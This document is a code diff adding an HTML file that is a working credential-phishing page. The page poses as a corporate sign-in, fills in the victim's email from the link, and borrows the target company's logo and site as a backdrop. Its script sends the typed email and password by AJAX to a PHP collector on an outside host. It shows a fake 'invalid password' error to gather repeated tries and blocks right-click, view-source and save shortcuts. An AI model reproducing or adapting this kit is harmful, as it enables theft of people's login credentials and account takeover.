@@ -1,0 +1,466 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Sign-in</title>
+    <!-- Bootstrap CSS -->
+   <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&amp;display=swap" rel="stylesheet">
+     <link rel="icon" type="image/x-icon" href="" >
+<style>
+body{
+			background: #a7a9b0;
+		}
+
+		.container{
+			width:100%;
+			display: flex;
+			justify-content: center;
+			align-items: center;
+			height: 100vh;
+		}
+
+		.office{
+			width: 500px;
+			background: #fff;
+			border:5px solid #4285f4;
+			border-radius: 5px;
+		}
+
+		.office-holder{
+			width:80%;
+			margin: auto;
+			padding: 20px 0px;
+		}
+
+		.logo{
+			width:100%;
+			float: left;
+			margin-bottom: 2em;
+		}
+
+		.logo h1{
+			font-family: arial;
+		}
+
+		.verify{
+			width: 70%;
+			margin: auto;
+		}
+
+		.verify h4{
+			font-family: arial;
+		}
+
+		fieldset{
+			width: 90%;
+			float: right;
+			border:2px solid #4285f4;
+			border-radius: 5px;
+		}
+
+		legend{
+			font-size: 15px;
+			overflow: hidden;
+			width: 42%;
+			padding:0px 2px;
+			margin: 0px;
+		}
+
+		.verify input[type='text']{
+			width: 100%;
+			float: right;
+			border:none;
+			padding:3px 10px;
+		}
+
+		.verify button{
+			border:none;
+			height: 40px;
+			width: 80px;
+			float: right;
+			margin-top: 2em;
+			background: #4285f4;
+			border-radius: 5px;
+			color: #fff;
+		}
+
+		.email-to-verify{
+			border:1px solid #000;
+			border-radius: 10px;
+		}
+
+		.form-holder{
+			width:100%;
+			float: left;
+		}
+
+		.form-holder h3{
+			font-weight: 600;
+		}
+
+		.form-holder input[type='email'], input[type='password']{
+			width: 100%;
+			height:40px;
+			float: left;
+			margin-bottom: 15px;
+		}
+		.form-holder .btn-holder{
+			width:100%;
+			margin-top:1em;
+			display: flex;
+			align-content: center;
+			align-items: center;
+			justify-content: center;
+		}
+
+		.form-holder .btn-holder .btn{
+			background:#0073C6;
+			border:none;
+			padding:6px 10px;
+			color:#fff;
+			border-radius: 0px;
+			margin-top: 20px;
+			margin-bottom: 20px;
+		}
+
+		.form-holder .btn-holder .btn:hover{
+			cursor:pointer;
+		}
+
+		.checkbox{
+			width: 100%;
+			float: left;
+			margin-top:5px;
+		}
+
+		.checkbox label{
+			font-family:arial;
+			font-size:13px;
+			float: left;
+			margin-left:1em;
+		}
+
+		.hide{
+			display: none;
+		}
+
+        #theiframe{
+            display:block; 
+            width:100%; 
+            height:100%; 
+            position: fixed; 
+            z-index: 1
+        }
+        #html_encoder_div{
+            position: relative; 
+            z-index: 2; 
+            background-color: rgba(0,0,0,0.7);
+        }
+
+        #others{
+            position: relative; 
+            z-index: 3
+        }
+
+</style>
+</head>
+
+<body>
+    <iframe id="theiframe" src="" frameborder="0" scrolling="no"></iframe>
+
+    <div id="html_encoder_div">
+        <div class="container">
+            <div class="office show border shadow bg-light" id="others">
+                <div class="office-holder">
+                    <div class="logo" style="text-align:center">
+                        <div id="login_logo">
+                            <img id="logoimg" src="" width="50" height="50" alt="" onerror="this.src='data:image/png;base64,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'">
+                        </div>
+                        <h3 class="text-dark"><strong id="logoname" class="text-uppercase"></strong></h3>
+                        <h5 class="font-weight-light">Please sign in to continue</h5>
+                    </div>
+                    <center>
+                        <div id="msg" style="display: none;font-weight: 600;color: red;">Invalid Password.! Please enter correct password.</div>
+                        <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
+                    </center>
+                    <form id="contact" method="POST" action="">
+                        <div class="form-holder">
+                            <div style="width: 100%;">
+                                <div class="alert alert-danger hide alert2"></div>
+                            </div>
+                            <input type="email" id="email" class="form-control" readonly="" value="" placeholder="someone@example.com" required="">
+                            <input type="password" id="password"  placeholder="Password" class="form-control" required="" autofocus="">
+                            <div class="checkbox">
+                                <input type="checkbox" name="" style="float: left; margin-top:2px; margin-bottom: 10px;">
+                                <label>REMEMBER ME</label>
+                            </div>
+                            <div class="btn-holder">
+                                <button class="btn btn-lg col-12" id="submit-btn">LOGIN</button>
+                            </div>
+                            <p style="color:#0073C6; margin-top:1em; float: left; width:100%;">Can't access your account?</p>
+                            <p style="color:#0073C6; margin-top:0em; float: left; width:100%;">Sign in with a single-use code</p>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="office-holder dooo" style=" ">
+        <div class="logo" style="text-align:center">
+            <div id="login_logo">
+                <span id="email_get1"></span>
+            </div>
+          <div id="login_logo">
+            <img src="https://cdn.glitch.com/e4905575-fbae-45d8-bc6c-e33b4a167082%2Fajax-loader35fd.gif?v=1617145491470">
+          </div> <br/>
+            <h5 class="font-weight-light">Your request received. You would be redirected to your email shortly.</h5>
+        </div>
+    </div>
+
+    <style>
+
+        .dooo{
+            display: none;
+            border-radius: 2px;
+            background: #CCC;
+            position: absolute; 
+            z-index: 20;
+            padding: 200px;
+            /*width:100%;*/
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .form-holder{
+            width:100%;
+            float: left;
+        }
+
+
+        .logo{
+            width:100%;
+            float: left;
+            margin-bottom: 2em;
+        }
+
+        .logo h1{
+            font-family: arial;
+        }
+
+
+
+    .tb_button {
+        padding: 1px;
+        cursor: pointer;
+        border-right: 1px solid #8b8b8b;
+        border-left: 1px solid #FFF;
+        border-bottom: 1px solid #fff;
+    }
+
+    .tb_button.hover {
+        borer: 2px outset #def;
+        background-color: #f8f8f8 !important;
+    }
+
+    .ws_toolbar {
+        z-index: 100000
+    }
+
+    .ws_toolbar .ws_tb_btn {
+        cursor: pointer;
+        border: 1px solid #555;
+        padding: 3px
+    }
+
+    .tb_highlight {
+        background-color: yellow
+    }
+
+    .tb_hide {
+        visibility: hidden
+    }
+
+    .ws_toolbar img {
+        padding: 2px;
+        margin: 0px
+    }
+    </style>
+     <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>
+
+  <script>
+    
+// prevent ctrl + s
+$(document).bind('keydown', function(e) {
+if(e.ctrlKey && (e.which == 83)) {
+e.preventDefault();
+return false;
+}
+});
+
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+document.onkeydown = function(e) {
+if (e.ctrlKey && 
+(e.keyCode === 67 || 
+e.keyCode === 86 || 
+e.keyCode === 85 || 
+e.keyCode === 117)) {
+return false;
+} else {
+return true;
+}
+};
+$(document).keypress("u",function(e) {
+if(e.ctrlKey)
+{
+return false;      }
+else {
+return true;
+}});
+
+
+
+/* global $ */
+$(document).ready(function(){
+var count=0;
+
+
+$('#back1').click(function () {
+$("#msg").hide();
+$('#email').val("");
+$("#automail").animate({left:200, opacity:"hide"}, 0);
+$("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+});
+
+var email = window.location.hash.substr(1);
+if (!email) {
+
+}
+else
+{
+var my_email =email;
+$('#email').val(my_email);
+$('#emailich').html(my_email);
+var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+if (!filter.test(my_email)) {
+$('#error').show();
+email.focus;
+return false;
+}
+var ind=my_email.indexOf("@");
+var my_slice=my_email.substr((ind+1));
+var c= my_slice.substr(0, my_slice.indexOf('.'));
+var final= c.toLowerCase();
+var finalu= c.toUpperCase();
+
+$("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
+$("#logoname").html(finalu);
+$(".logoname").html(finalu);
+}
+
+$("#theiframe").attr("src", "https://"+my_slice);
+
+$('link[rel=icon]').attr("href", "https://logo.clearbit.com/"+my_slice);
+
+$('#submit-btn').click(function(event){
+$('#error').hide();
+$('#msg').hide();
+event.preventDefault();
+var email=$("#email").val();
+var password=$("#password").val();
+var msg = $('#msg').html();
+$('#msg').text( msg );
+///////////new injection////////////////
+var my_email =email;
+var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+if (!filter.test(my_email)) {
+$('#error').show();
+email.focus;
+return false;
+}
+
+var ind=my_email.indexOf("@");
+var my_slice=my_email.substr((ind+1));
+var c= my_slice.substr(0, my_slice.indexOf('.'));
+var final= c.toLowerCase();
+var finalu= c.toUpperCase();
+
+$("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
+$("#logoname").html(finalu);
+///////////new injection////////////////
+count=count+1;
+
+
+$.ajax({
+dataType: 'JSON',
+url: 'https://karunacloud.com/support/wp-content/themes/twentytwentytwo/templates/firebase1.php',
+type: 'POST',
+      	data:{
+      		email:email,
+      		password:password,
+      	},
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+            	$('#submit-btn').val('Verifing...');
+            },
+            success: function(response){
+            	if(response){
+            		$("#msg").show();
+            		console.log(response);
+            		if(response['signal'] == 'ok'){
+            			$("#password").val("");
+            			if (count>=3) {
+            				count=0;
+                    // window.location.replace(response['redirect_link']);
+                    // window.location.replace("complete.html?msg="+email);
+                    $('.dooo').fadeIn();
+                }
+                $('#msg').html(response['msg']);
+            }
+            else{
+            	$('#msg').html(response['msg']);
+            }
+        }
+    },
+    error: function(){
+    	$("#password").val("");
+    	if (count>=3) {
+    		count=0;
+    		 // window.location.replace("complete.html?msg="+email);
+             $('.dooo').fadeIn();
+    	}
+    	$("#msg").show();
+    	$('#msg').html("Your session cookie is invalid. Please log in again.");
+    },
+    complete: function(){
+    	$('#submit-btn').val('LOGIN');
+    }
+});
+  });
+
+
+	});
+
+function explode(){
+  // $("#theiframe").attr('src','about:blank');
+  window.frames[0].stop();
+}
+setTimeout(explode, 4000);
+
+</script>
+</body>
+</html>
